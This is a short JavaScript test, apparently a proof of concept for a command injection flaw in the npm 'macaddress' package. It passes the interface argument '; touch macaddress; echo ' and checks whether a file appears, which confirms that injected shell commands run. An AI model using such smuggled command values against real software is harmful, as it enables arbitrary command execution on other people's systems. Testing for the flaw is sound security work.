test("Command Injection in macaddress", (done) => {
  expect.assertions(2);
  const fs = require("fs");
  const path = "./macaddress";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let iface = "; touch macaddress; echo ";
  require("macaddress").one(iface, function (err, mac) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
